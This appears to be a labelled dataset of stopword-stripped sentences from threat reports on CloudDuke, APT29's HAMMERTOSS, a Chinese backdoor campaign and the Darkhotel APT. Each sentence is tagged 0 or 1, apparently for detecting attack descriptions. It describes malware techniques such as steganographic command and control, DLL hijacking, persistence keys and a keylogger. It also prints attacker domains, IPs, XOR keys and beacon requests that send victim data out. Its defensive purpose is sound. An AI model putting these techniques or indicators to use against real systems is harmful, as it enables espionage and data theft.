The first files decoy audio file PDF file second one CloudDuke loader embedding CloudDuke downloader - called " DropperSolution "	0
In cases victim presented decoy file background downloader proceeded download execute one CloudDuke trojans " OneDriveSolution " " BastionSolution "	0
Interestingly however CloudDuke spear - phishing campaigns observed July born striking resemblance CozyDuke spear - phishing campaigns seen almost exactly year ago beginning July 2014	0
In spear - phishing campaigns decoy document exact PDF file " US letter fax test page " ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b )	0
Similarly URLs hosting malicious files campaigns purported related eFaxes	0
It also interesting note case CozyDuke - inspired CloudDuke spear - phishing campaign downloading execution malicious archive linked emails resulted execution CloudDuke downloader execution " BastionSolution " component thereby skipping one step process described CloudDuke spear - phishing campaigns	0
CloudDuke first time observed Duke group use cloud services general Microsoft OneDrive specifically part operations	0
Earlier spring released research CozyDuke mentioned observing CozyDuke sometimes either directly use OneDrive account exfiltrate stolen data alternatively CozyDuke downloading Visual Basic scripts would copy stolen files OneDrive account sometimes even retrieve files containing additional commands OneDrive account	0
In previous cases Duke group used OneDrive secondary communication channel still relied traditional C&C channels actions	0
It therefore interesting note CloudDuke actually enables Duke group rely solely OneDrive every step operation downloading actual trojan passing commands trojan finally exfiltrating stolen data	0
By relying solely 3rd party web services OneDrive command control channel believe Duke group trying better evade detection	0
Large amounts data transferred organization 's network unknown web server easily raises suspicions	0
However data transferred popular cloud storage service normal	0
What better way attacker surreptitiously transfer large amounts stolen data way people transferring data every day legitimate reasons	0
( Coincidentally implications 3rd party web services used command control channels also subject upcoming talk VirusBulletin 2015 conference )	0
Developing even single multipurpose malware toolset never mind many requires time resources	0
Therefore seems logical attempt reuse code supporting frameworks different toolsets	0
The Duke group however appear taken step SeaDuke CloudDuke component BastionSolution rewriting code multiple programming languages	0
This obvious benefits saving time resources providing two malware toolsets similar inside appear completely different outside	0
This way discovery one toolset immediately lead discovery second toolset	0
The Duke group long suspected ties Russian state running espionage operation unusually long time - especially lately - unusual brazenness	0
These latest CloudDuke SeaDuke campaigns appear clear sign Duke 's planning stop time soon	0
Research post Artturi ( @lehtior2 ) F - Secure detects CloudDuke Trojan W32/CloudDuke B Trojan W64/CloudDuke B Samples	0
Compromised servers used command control	0
Compromised websites used host CloudDuke	0
T Russian cyber threat groups monitor frequently design innovative ways cover tracks	0
In early 2015 came across stealthy malware - call HAMMERTOSS - advanced persistent threat group suspect Russian government sponsors	0
We designate group APT29	0
Using variety techniques - creating algorithim generates daily Twitter handles embedding pictures commands - developers behind HAMMERTOSS devised particularly effective tool	0
APT29 tries undermine detection malware adding layers obfuscation mimicking behavior legitimate users	1
HAMMERTOSS uses Twitter GitHub cloud storage services relay commands extract data compromised networks	0
Using variety techniques - creating algorithms generate daily Twitter handles embedding pictures commands - developers behind HAMMERTOSS devised particularly effective tool	0
HAMMERTOSS works	0
While none tactics new combination techniques piqued interest	0
KALININGRAD TIME MOSCOW TIME SAMARA TIME YEKATERINBURG TIME OMSK TIME KRASNOYARSK TIME IRKUTSK TIME YAKUTSK TIME VLADIVOSTOK TIME SREDNEKOLYMSK TIME KAMCHATKA TIME ( UTC + 02/MSK-1 ) ( UTC + 03/MSK ) ( UTC + 04/MSK+1 ) ( UTC + 05/MSK+2 ) ( UTC + 06/MSK+3 ) ( UTC + 07/MSK+4 ) ( UTC + 08/MSK+5 ) ( UTC + 09/MSK+6 ) ( UTC + 10/MSK+7 ) ( UTC + 11/MSK+8 ) ( UTC + 12/MSK+9 ) APT29 operating current form since least late 2014	0
We suspect Russian government sponsors group organizations targets data steals	0
Additionally APT29 appeared cease operations Russian holidays work hours seem align UTC + 3 time zone contains cities Moscow St.	0
Petersburg	0
While APT groups try cover tracks thwart investigators groups show discipline consistency	0
Similarly groups display ability adapt network defenders ' attempts mitigate activity remove victim networks	0
For example APT29 almost always uses anti - forensic techniques monitor victim remediation efforts subvert	0
Likewise group appears almost solely uses compromised servers CnC enhance security operations maintains rapid development cycle malware quickly modifying tools undermine detection	1
These aspects make APT29 one capable APT groups track	0
5 W e first identified HAMMERTOSS early 2015	0
APT29 likely used HAMMERTOSS backup two primary backdoors execute commands maintain access group 's principal tools discovered	0
We identified two HAMMERTOSS variants give APT29 alternative ways communicate malware	0
The developer appears name variants uploader tDiscoverer.1 Both variants written C # programming language	0
Each variant uses different methods acquire CnC instructions either directly accessing hard - coded website accessing Twitter intermediary	1
We focus tDiscoverer report	0
Five Stages HAMMERTOSS We broken malware communication process five stages explain tool operates receives instructions extracts information victim networks	0
The stages include information APT29 outside compromised network communicate HAMMERTOSS brief assessment tool 's ability mask activity	0
6 heaading STAGE 1 /heading The Communication Process Begins Twitter H AMMERTOSS first looks instructions Twitter	0
The malware contains algorithm generates daily Twitter handle account user ID	0
To create handles algorithm employs basename " Bob " appends prepends three CRC32 values based date	0
For example " 1abBob52b " would URL hxxps://twitter.com/1abBob52b	0
Each HAMMERTOSS sample create different Twitter handle day	0
APT29 knows algorithm used generate handles chooses register Twitter handle post obfuscated instructions handle 's URL malware attempts query	0
If particular day 's handle registered URL day found HAMMERTOSS wait next day attempt communicate another handle	0
APT29 typically configures HAMMERTOSS communicate within certain restrictions checking Twitter handle weekdays specified start date	0
This allows malware blend " normal " traffic victim 's work week remain dormant period time activating	0
7 Tweeting URL Minimum File Size Image Part Encryption Key I f APT29 registered day 's Twitter handle tweet URL hashtag	0
The URL directs HAMMERTOSS webpage containing image images	0
The hashtag provides number representing location within image file characters appending encryption key decrypt instructions within image	0
In mockup HAMMERTOSS tweet Figure 2 hashtag # 101docto indicating encrypted data begins offset 101 bytes image file characters docto added encryption key decrypt data	0
Using Twitter intermediary deliver second - stage CnC HAMERTOSS allows APT29 dynamically direct tool	1
In Figure 3 sample HAMMERTOSS tDiscoverer variant corresponding snapshot Twitter account page one generated handles	0
At time publication publicly available HAMMERTOSS sample five generic detections VirusTotal	0
The Twitter account active contained link website	0
HIDING AMONG UNREGISTERED TWITTER ACCOUNTS H AMMERTOSS uses algorithm generate hundreds Twitter handles annually potential CnC.	0
Many unregistered APT29 chooses register particular day 's handle needed ahead anticipated HAMMERTOSS beacon	0
This small number registered accounts allows group maintain small footprint	0
Other tools use Twitter relay instructions including:2 MiniDuke behaves similarly HAMMERTOSS using Twitter CnC also downloading image files containing encrypted appended content	1
9 Visiting GitHub Download Image H AMMERTOSS uses InternetExplorer	0
Application COM Object visit URL specified tweet	0
We observed URLs lead specific GitHub accounts compromised websites	0
We use Github next part example	0
Once HAMMERTOSS obtains GitHub URL daily Twitter account visits URL downloads contents page including image files	0
APT29 Employs Basic Steganography H AMMERTOSS downloads contents website Internet Explorer 's browser cache searches cache images least large offset specified tweet Stage 2	0
While image appears normal actually contains steganographic data	0
Steganography practice concealing message image file within another message image file	0
In case image contains appended encrypted data HAMMERTOSS decrypt execute	0
The data may include commands login credentials upload victim 's data cloud storage service	1
HAMMERTOSS locates encrypted data offset specified tweet Stage 2	0
It decrypts data using key comprised hard - coded data malware binary appended characters tweet	0
APT29 ADDING STEGANOGRAPHY AS ANOTHER LAYER OF OBFUSCATION We observed APT groups using steganography	0
HAMMERTOSS uses steganography appending data image file image 's end file marker	0
This technique would readily detectable someone checking	0
However appended data encrypted even detected investigator would unable decrypt data without key material two sources malware binary current tweet	0
group ensures network defenders discover images defenders still require malware sample corresponding Twitter handle tweet additional key material decrypt tool 's instructions	0
All samples observed used Indicative APT29 's discipline different encryption keys decrypt appended content	0
Executing Commands Uploading Victim Data APT29 's operator creates cloud storage account obtain victim 's data cloud storage service	0
T encrypted data image may include instructions execute commands via PowerShell execute direct command file save executable disk execute	1
In several cases commands directed HAMMERTOSS upload information victim networks accounts cloud storage services using login credentials received Stage 4	1
In GitHub example decrypted data instructed backdoor obtain list running tasks reconnaissance victim network - upload specific account cloud storage service using login credentials	1
APT29 easily obtain extracted information cloud storage service convenience	0
Difficulty Identifying Accounts Discerning Legitimate Malicious Traffic Locating Payload H AMMERTOSS undermines network defenders ' ability identify Twitter accounts used CnC discern malicious network traffic legitimate activity locate malicious payloads downloaded malware	0
APT29 AN ADAPTIVE AND DISCIPLINED THREAT GROUP HAMMERTOSS illustrates APT29 's ability adapt quickly operations avoid detection removal	1
For example organization blocks access GitHub APT29 could easily redirect HAMMERTOSS download image encrypted instructions another website	0
Similarly organization starts monitoring Twitter activity network APT29 could easily switch using Uploader variant HAMMERTOSS use Twitter communicates directly specified URL	0
If organization identifies handle generation algorithm attempts research old Twitter accounts tweets secondary URLs APT29 could easily delete previously used accounts locations images stored	0
While technique HAMMERTOSS new APT29 combined single piece malware	0
Individually technique offers degree obfuscation threat group 's activity	0
In combination techniques make particularly hard identify HAMMERTOSS spot malicious network traffic ; determine nature purpose binary ; discern malware 's CnC method predict CnC accounts ; capture decode second - stage CnC information ; pinpoint decrypt image files containing malware commands	0
This makes HAMMERTOSS powerful backdoor disposal one capable threat groups observed	0
To download FireEye Threat Intelligence reports visit https://www.fireeye.com/reports.html FireEye Inc.	0
| 1440 McCarthy Blvd	0
Milpitas CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com 2015 FireEye Inc.	0
All rights reserved	0
FireEye registered trademark FireEye Inc.	0
All brands products service names may trademarks service marks respective owners	0
SP.APT29.EN - US.072015	0
May 13 2015 By Jon Gross(http://blog.cylance.com / author / jon - gross ) Share This	0
Attackers typically shut campaigns halt activity exposed security researchers thereby creating impression dropped map	0
This often leads false sense security within community perpetuates idea public exposure makes us safer	0
While exposed activity longer observed attackers simply continue background – evolving altering tactics seamlessly continue operations increasingly advanced malware	0
So potentially making us safer short - term exposure often forces Darwinian evolution malware	0
Several months ago I examined malware - tainted Word document titled " ISIS_twitter_list.doc " I n't think much quickly moved cursory analysis	0
Yet I recently uncovered evidence suggests work well - known Chinese threat group	0
This group known targeted U.S.	0
government agencies defense contractors aerospace firms foreign militaries since 2009	0
Until widely believed actor 's activities largely subsided 2013 following numerous public disclosures detailed analyses backdoors	0
Our technical analysis shows group remained active	0
We releasing data help victims identify remediate threat	0
Click here(http://blog.cylance.com / spear - - threat - actor- resurfaces#mitigation ) get recommended mitigations technical details read	0
It began MIME encoded document " ISIS_twitter_list.doc " exploited familiar CVE-2012- 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi?name = CVE-2012 - 0158 ) first uploaded Virustotal user India	0
Other targets identified predominantly located Australia New Zealand Vietnam United States	0
File Details Name ISIS_twitter_list.doc SHA256 6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40 File Size 146,338 bytes The first stage shellcode searches marker " GfCv " checks next four bytes " EF FE EC CE " document decodes second stage shellcode using four - byte XOR key " 0x29F7C592 "	0
This second stage finds decodes encoded executable beginning offset 0x33A2	0
The binary encoded using variable 4-byte XOR key generated starting 4-byte key 0x7FFEFC00 ; XOR key permutated every four bytes rotating first two bytes key 0x1 shifting bits next two bytes right 0x1 next 4-byte XOR key series would 0x3FFF7E00	0
It includes logic exclude XOR'ng bytes match 0x00000000 current 4- byte XOR key	0
For binary mathematically impaired like 4-byte keys eventually repeat effect creating 256-byte XOR key	0
The decoded binary written filesystem " % APPDATA%\Microsoft\Systemcertificates\Certificates.ocx "	0
File Details Full File Path % APPDATA%\Microsoft\Systemcertificates\Certificates.ocx SHA256 9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165 File Size 107,008 bytes Compile Time 2/4/2015 8:41:42 UTC The malware execute immediately successful exploitation instead creates Run key current user 's hive execute next time victim user accesses system	1
Registry Persistence Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates Registry Key Value Rundll32.exe " % APPDATA%\Microsoft\SystemCertificates\Certificates.ocx",Setup The ocx file actually DLL provides attacker ability upload download enumerate delete search execute files well list drivers system	1
The binary designed called one exported function " Setup " ; Run key ensure whenever victim user logs system backdoor execute	1
The binary configured communicate " www.microsoftservices.proxydns.com " port 80 using standard HTTP POST GET requests	1
The domain time report resolved IP address " 103.229.125.157 "	0
Additionally dynamic DNS domains " fighthard.mooo.com " " rampage.freetcp.com " historically resolved IP address	0
Example initial beacon request	0
GET /login?wd = hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q- H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH- nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ== HTTP/1.1 User - Agent Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 2.0.50727 ; .NET CLR 3.0.4506.2152 ; .NET CLR 3.5.30729 ; .NET CLR 1.1.4322 ) Host www.microsoftservices.proxydns.com Cache - Control - cache The beacon request decoded base64 decoding alphabet " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789- _ "	0
Then RC4 decrypting resulting string using first four bytes payload decryption key	0
The following python script make easy	0
Crypto Cipher import ARC4 Decoding string yield following	0
Where k unique identifier victim campaign identifier included backdoor h hostname victim computer u victim user operating system service pack level mac address	0
Based upon cursory analysis backdoor look encrypted commands within HTML comments returned C2 using following format " ? * $ @COMMAND GOES HERE@$ * ? ;"however C2 active time analysis could confirmed	1
The backdoor may also make requests C2 HTTP using following parameters URI string " query?sid= " " result ? sid= "	1
The PDB path C:\Codes\Eoehttp\Release\Eoehttp.pdb also left backdoor although instances path could identified	0
Several additional exploit documents identified investigating domains " fighthard.mooo.com " " rampage.freetcp.com "	0
Fighthard.mooo.com additionally resolved 173.224.214.12 February 2014	0
The following exploit documents identified contain payload communicated domain	0
Naval Science Curriculum 2014.doc 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c 1.doc c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd Republic Day speech 27 Jan 2014.doc 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911 Rampage.freetcp.com still resolves 103.229.125.157 4/2/2015 Let 's go ahead take look one expoit documents 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c	0
SHA256 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c Name Naval Science Curriculum 2014.doc File Size 459,087 The document exploits old faithful CVE-2012 - 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2012 - 0158 ) instead using MIME encoded document file plain RTX document	0
Yes 's misspelling Word happy open RTF format well	0
So anyone exploring hunting RTF documents may also want start looking " { \rtx " header	0
We 'll skip shellcode analysis go directly binary stored beginning offset 0x1BC27 ASCII hex - encoded xor - encoded binary	0
It decoded using XOR key " 0xBF "	0
Upon successful exploitation decoded binary written first % TEMP%\dw20.EXEthen copied % WINDIR%\msascm32.drv	0
No changes made system	0
File Details Full File Path % WINDIR%\msacm32.drv SHA256 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3 File Size 108,544 Bytes Compile Time 9/26/2013 01:46:23 UTC I 'm always curious registry changes made exploitation process	0
At first backdoor failed load really anything VM I read " msascm32.drv " file	0
Looking original file 's ( % WINDIR%\system32\msacm32.drv ) imported functions 's clear DLL responsible type audio processing and/or playback	0
A quick search internet confirmed I added soundcard VM	0
On reboot explorer.exe happy load backdoor get business ; technique known dll search order hijacking binary planting	1
Interestingly backdoor also load legitimate system32\msacm32.drv file resolve functions pass calls n't break audio playback victim system	1
The backdoor contains identical exports well additional dummy function legitimate msacm32.drvcalled " StartWork " used reliably identify similar samples	1
The backdoor routine exists inside DllMain function explorer.exeloads backdoor via LoadLibrary begin spawning malicious threads	1
A PDB path also left binary C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb ; A quick google search lead YARA rule written Patrick Olsen similar sample 869fa4dfdbabfabe87d334f85ddda234 communicates www.micro1.zyns.com TCP port 80	0
The two files also identical compilation time suggests backdoor probably recompiled often instead attacker simply updates callback configuration information	0
The backdoor interestingly contains well known Poison Ivy RAT shellcode well custom backdoor	0
It first attempt communicate fighthard.mooo.com using poison ivy binary protocol default connection password " admin "	0
The Poison Ivy shellcode encrypted using custom cipher key " Tiger324 { " beginning offset 0xFA5 ending 0x159E.	0
If initial connection fails revert secondary backdoor utilizes HTTP GET POST requests somewhat similar ones described internal IP address " 192.168.2.26 "	0
This suggested attacker already compromised systems environment using internal C2 mechanism fallback	0
Example Internal Beacon	0
GET /login.asp ? p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX EJ7OZkvwBZVx1JsrhQ== HTTP/1.1 User - Agent Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) Host 192.168.2.26 Requests may also made following pages " check.asp " " result.asp " " upload.asp "	0
The request structure slightly different uses base64 alphabet " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 + * "	0
The resulting request decoded using first 16 bytes result XOR key decode rest payload	0
It also uses static User - Agent string " Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) " request	0
The following script simplifies process	0
The request decodes " 123|000000+|USER - D6921F6215|Administrator|-1676096002|1.0|0| " values separated delimiter " | "	0
" 123 " campaign identifier hard coded backdoor	0
I n't know " 000000 + " 's also hard coded value ; best guess 's modify timezone timestamp	0
" USER - D6921F6215 " hostname victim " Administrator " victim user " 1676096002 " current Date / Time decimal " 1.0 " version number also stored backdoor The 16-byte XOR key randomly generated per request	0
Results commands sent back encoded server " result.asp " page	0
The backdoor accept following commands	0
Commands ? appear take additional parameter files end - require full file path	0
The backdoor also capable elevating privileges win7 using method similar one described http://www.pretentiousname.com/misc/win7_uac_whitelist2.html	0
I thought interesting backdoor used secondary backup backdoor addition primary payload	0
The first communicated directly outside network using well known RAT protocol failed secondary much stealthier backdoor communicated internal C2 address using 's custom encoded HTTP based protocol	0
The use relatively undisclosed DLL search order hijack also made sample unique	0
Detection rates binary seem pretty good right 39/57 ; however time first used late January 2014 detection rates much poorer	0
Other samples identified exploit documents similar one described different network callbacks	0
And tie back " well - known " threat group	0
The " 173.224.214.12 " IP address " fighthard.mooo.com " previously resolved also historically two domains point " queenberry.www1.biz " " word.crabdance.com "	0
" word.crabdance.com " previously resolved " 64.71.162.70 " September 8 2012 108.171.246.140 February 19 2014	0
The " 64.71.162.70 " address associated domain " www.ollay011.zyns.com " rather infamous first mention I could find shadowserver post http://blog.shadowserver.org/2012/04/16/beware - - - you- download - recent - purported - ceiec - document - dump - booby - trapped/ related exploit documents identified data dump Hardcore Charlie	0
If follow rabbit hole deep enough eventually trace samples via domain IP address crossover back FBI flash # A-000009-MW mid 2013	0
Additional domains IP addresses related group included appendix	0
While defending constant stream new malware advanced threat groups may difficult organizations take relatively easy steps help identify intrusions	0
This group among numerous threat actors rely almost exclusively Dynamic DNS infrastructure	0
They seem prefer ChangeIP ( https://www.changeip.com / services / free - dynamic - dns/(https://www.changeip.com / services / free- dynamic - dns/ ) ) Afraid ( https://freedns.afraid.org/(https://freedns.afraid.org/ ) ) free DNS services although previously heavily used Sitelutions ( https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns ) )	0
While legitimate instances dynamic DNS corporate environments accounts small percentage traffic	0
Monitoring and/or blocking dynamic DNS requests help detect attacks actor	0
Any dynamic DNS domains resolve non - routable IP addresses like 127.0.0.1 private IP addresses thoroughly investigated	0
The HTTP traffic generated samples uses limited number header fields substantially different majority traffic generated modern browsers	0
As always n't open E - mail attachments untrusted parties	0
Tags CylanceSPEAR(http://blog.cylance.com / topic / cylancespear ) Back Blog(http://blog.cylance.com )	0
The Darkhotel APT threat actor possessing seemingly inconsistent con- tradictory set characteristics advanced fairly rudimentary	0
In- hospitably operating almost decade threat actor currently active	0
The actor 's offensive activity tied specific hotel business center Wi‑Fi physical connections also tied p2p/file sharing networks known spear-phish targets well	1
Darkhotel tools detected '' Tapaoux '' '' Pioneer '' '' Karba '' '' Nemim '' among names	0
The following list presents set characteristics crew When unsuspecting guests including situationally aware corporate executives high-tech entrepreneurs travel variety hotels connect internet infected rare APT Trojan posing one several major software releases	1
These might GoogleToolbar Adobe Flash Windows Messenger etc	0
This first stage malware helps attackers identify significant victims leading selective download advanced stealing tools	1
At hotels installs selectively distributed targeted individuals	1
This group attackers seems know advance individuals arrive depart high-end hotels	0
So attackers lay wait travelers arrive connect Internet	0
The FBI issued advisories similar hotel incidents ; Australian government offi- cials produced similar newsworthy accounts infected	0
While FBI announcement related attacks hotel guests overseas appeared May 2012 related Darkhotel samples already circulating back 2007	0
And available Darkhotel server log data records connections early Jan 1 2009	0
Addition- ally seeding p2p networks widely spread malware 0-day spear-phishing attacks demonstrate Darkhotel APT maintains effective toolset long-running operation behind questionable hospitality shows guests	1
The Darkhotel APT 's precise malware spread observed several hotels' networks visitors connecting hotel 's Wi-Fi prompted install software updates popular software packages	1
Of course packages really installers Darkhotel APT 's backdoors added legitimate installers Adobe Google	1
Digitally signed Darkhotel backdoors installed alongside legitimate packages	1
The interesting thing delivery method hotels require guests use last name room number login yet guests received Darkhotel package	1
When visiting hotels honeypot research systems could n't attract Darkhotel attack	0
This data inconclusive points misuse check-in information	0
The Darkhotel actor maintained effective intrusion set hotel networks providing ample access unexpected points attack several years	0
These staging points also provide attackers access check-in/check-out identity information visitors high-end luxury hotels	0
As part ongoing investigation research led us embedded iframes within hotel networks redirected individuals ' web browsers phony install- ers	1
The attackers careful placement iframes executables trusted resources - hotels ' network login portals	0
The attackers also careful immediately delete traces tools soon attack carried successfully	1
Those portals reviewed cleaned undergoing review hardening process	0
We observed traces couple incidents late 2013 early 2014 victim hotel 's network	0
The attackers set environment hit individual targets precision	1
As soon target 's stay attack-frame closed attackers deleted iframe placement backdoored executables hotel network	1
The attackers successfully de- leted traces work earlier attacks another hotel offensive techniques	1
Outside reports activity hotels provide enough data confirm careful operations	0
The attack technique blurs line couple common APT tactics ; fairly inaccurate '' watering holes '' '' strategic web compromises '' accurate spearphishing techniques	0
In case Darkhotel attackers wait victim connect Internet hotel Wi-Fi cable room	0
There strong likelihood targets connect resourc- es attackers rely likelihood much like watering hole	0
But attackers also maintain truly precise targeting information victim 's visit much like would know victim 's email address content interests spearphishing attack	1
While setting attack Darkhotel attackers knew target 's expected arrival departure times room number full name among data	0
This data enables attackers present malicious iframe precisely individual target	1
So yet another unique characteristic attacker - employ loosely certain highly precise offensive approach	0
An example Darkhotel APT 's indiscriminate malware spreading dem- onstrated way seeds Japanese p2p sharing sites malware delivered part large ( approximately 900mb ) rar archive	1
The archive also spread bittorrent detailed	1
Darkhotel uses method distribute Karba Trojan	1
These Japanese archives translated Chinese speaking viewers appear sexual nature part anime sex/military comic scene exposing likely interests potential targets	0
This Darkhotel package downloaded 30,000 times less six months	1
The p2p bittorrent Darkhotel offering listed posted 2013.11.22	0
It spread throughout 2014	0
This torrent serves almost 900 mb file	0
The rar archive decompresses directory full encrypted zips associated decryptor password file decrypting zips	0
But looks like AxDecrypt.exe decryptor bound true decryptor dropper Darkhotel Catch.exe Karba Trojan	1
When user downloads torrent decrypts zip files trojan surrepti- tiously installed run victim system	1
Catch.exe detected Backdoor.Win32.Agent.dgrn communicates fol- lowing Darkhotel command control servers Other examples Darkhotel backdoor bound within shared torrent include adult content Japanese anime	1
There tens thousands down- loads individual torrents	0
The associated Darkhotel backdoor hosted bittorrent emule etc variety comic names	1
Examples include comics anime offerings	0
Related Darkhotel command control server domains include Darkhotel campaigns involving typical spear-phished Tapaoux implants publicly appeared bits pieces several times past five years	1
These subproject efforts targeted defense industrial base ( DIB ) government NGO organizations	0
Email content topics like nuclear energy weaponry capabilities used lure	0
Early accounts posted contagio describing attacks NGO organi- zations government policy makers	0
This spear-phishing activity continues 2014	1
The attacks follow typical spear-phishing process past couple months exploited systems retrieved downloader executables web servers like Over past years group emailed links redirect targets ' brows- ers Internet Explorer 0-day exploits	1
Sometimes attachment includes Adobe 0-day exploit	1
This crew occasionally deploys 0-day exploits burns required	0
In past years deployed 0-day spear-phishing attacks targeting Adobe products Microsoft Internet Explorer including cve­2010­0188	1
In early 2014 researchers exposed use cve­2014­0497 Flash 0-day described Securelist early February	0
The crew spear-phished set target systems connected Internet Chinese ISPs developed capabilities within 0-day exploits handle hardened Windows 8.1 systems	1
It 's interesting Flash objects embedded Korean documents titled '' List latest Japanese AV wind use torrents.docx '' ( loose English translation )	1
The dropped downloader ( d8137ded710d83e2339a97ee78494c34 ) delivered malcode similar '' Information Stealer '' component functionality summarized detailed Appendix D	1
The Darkhotel actors typically sign backdoors digital certificates one kind another	0
However certificates originally chosen crew interesting weak keys likely abuse attackers	0
Here listing certs commonly used sign Darkhotel malcode requiring advanced mathematical capabilities factorize keys time	0
They certificates used group	0
More recent activity suggests group stolen certificates sign code	0
All related cases signed Darkhotel malware share Root Certificate Authority Intermediate Certificate Authority issued certificates weak md5 keys ( RSA 512 bits )	0
We confident Darkhotel threat actor fraudulently duplicated certificates sign malware	0
These keys stolen	0
Many certificates noted 2011 Fox­IT post '' RSA­512 Certificates Abused Wild ''	0
To support speculation please note non­specific Microsoft Security Advisory Mozilla advisory addressing issue time Entrust responses	0
From Microsoft 's security advisory Thursday November 10 2011 '' Microsoft aware DigiCert Sdn	0
Bhd Malaysian subordinate certifica- tion authority ( CA ) Entrust GTE CyberTrust issued 22 certifi- cates weak 512 bit keys	0
These weak encryption keys broken could allow attacker use certificates fraudulently spoof content perform phishing attacks perform man­in­the­middle attacks Web browser users including users Internet Explorer	1
While vulnerability Microsoft product issue affects supported releases Microsoft Windows	0
There indication certificates issued fraudulently	0
Instead cryptographically weak keys allowed certificates dupli- cated used fraudulent manner	0
Microsoft providing update supported releases Microsoft Windows revokes trust DigiCert Sdn	0
Bhd	0
The update revokes trust following two intermediate CA certificates Digisign Server ID – ( Enrich ) issued Entrust.net Certification Authority ( 2048 ) Digisign Server ID ( Enrich ) issued GTE CyberTrust Global Root '' From Mozilla 's 2011 response '' While indication issued fraudulently weak keys allowed certificates compromised	0
Furthermore certificates CA contain several technical issues	0
They lack EKU extension specifying intended usage issued without revocation information	0
'' From Entrust 's response '' There evidence Digicert Malaysia certificate authorities compromised	0
'' Here notes costs technical requirements attacking certificates	0
The computing power required crack factor RSA 512 bit key $ 5000 period time required 2 weeks	0
( see http //lukenotricks	0
blogspot.co.at/2010/03/rsa­512­factoring­service­two­weeks.html ) In October 2012 Tom Ritter reported would cost $ 120­- $ 150 per- haps even little $ 75	0
Going even back much discussion technical meth- ods cracking keys DJ Bernstein 's 2001 paper building machine reducing cost integer factorization Number Field Sieve techniques breaking 1024 bit RSA keys	0
RSA 's reaction 2002 statement whether 1024 bit RSA keys broken '' NIST offered table proposed key sizes discussion key man- agement workshop November 2001 [ 7 ]	0
For data needs protected later year 2015 table indicates RSA key size least 1024 bits	0
For data needs protected longer key size least 2048 bits	0
'' Recent Tapaoux attacks backdoors include malware signed strong SHA1/RSA 2048 bit certificates suggesting certificate theft	0
One interesting components discovered part cam- paign use digitally­signed advanced keylogger	1
It clean well­written kernel level malcode	0
The languages strings mix English Korean	0
It signed familiar '' belinda.jablonski @ syniverse.com '' digital certificate	0
This keylogger dropped code running within svchost.exe WinXP SP3 maintains interesting debug string It probably developed part mid-to-late 2009 project e \project\2009\x\totalsource\32bit\ndiskpro\src\ioman.c This driver package built resemble legitimate low-level Microsoft system device	1
It installed system kernel driver '' Ndiskpro '' service described '' Microcode Update Device ''	1
It slightly surprising rootkit functionality hides service When loaded NDISKPRO.SYS driver hooks INT 0x01 INT 0xff retrieves keystroke data directly port 0x60 motherboard keyboard con- troller	1
It buffers communicates logged user data running user mode component	0
This component encrypts writes retrieved values ondisk randomly named .tmp file like ffffz07131101.tmp	1
This file located directory original dropper maintains persistence across reboots simple addition HKCU run key	1
This keylogger module encrypts stores gathered data log file men- tioned previously	1
Its encryption algorithm similar RC4	0
The interesting part module randomly generates key stores unexpected place middle log file name	0
Hence numeric part filename used seed pseudorandom number generator	0
The rand function statically linked ensure results different computers	0
The Darkhotel toolset consists multiple components slightly modified time	0
These tools dropped hotel installers spoofing legiti- mate software installers bound within torrent bundles dropped exploits hypertext linked spear-phishing emails	1
More advanced tools like keylogger decribed later downloaded victim system one implants	1
In recent case word docs embed- ded 0-day flash swf files either dropped backdoors downloaded executed backdoors remote web servers	1
These tools pull keylog- ger steal information system download tools	1
The interesting behaviors components include This module quite small ( 27Kb ) comes part WinRar SFX file drops starts module % APPDATA % \Microsoft\Crypto\DES64v7\msieckc.exe	1
This module designed update malicious components recurring checks C & C server	1
It also capable removing older components names hardcoded body malware	1
The module adds autorun registry settings enable automatic start system boot	1
One interesting functions executable unusual delay persistence	1
If special file exists system module start calling back C & C server special file 180 days old	0
So critical malicious component removed period current module backs restores access system within 6 months	1
The component gathers system information sends Darkhotel com- mand control servers detailed Appendix D. This module relatively large ( 455Kb ) comes part WinRar SFX file drops starts module % APPDATA % \Microsoft\Display\DmaUp3 exe	1
The main purpose module collect various secrets stored lo- cal system upload Darkhotel command control servers This module designed terminate Windows system de- fault codepage set Korean	1
This malware 220Kb size	0
It built MFC framework application lot extra calls complicated analysis sample	1
It mim- ics GUI desktop application create visible windows dialogs interact local users	1
The Trojan collects data system anti­ malware software installed uploads data Darkhotel command control servers	1
More technical details provided Appendix D. This malware 63kb size	0
It bound variety software packages vary name host package consistently detected '' Virus.Win32	1
Pioneer.dx ''	0
It drops igfxext.exe '' selective infector '' component disk runs	1
This component virus used selectively infiltrate comput- ers via USB network shares	1
First virus retrieves available disks starting disk number 4 ( D \ ) disk number 20 ( Z \ ) finds executable files infects	1
The code simply brute forces list mapped removable drives	1
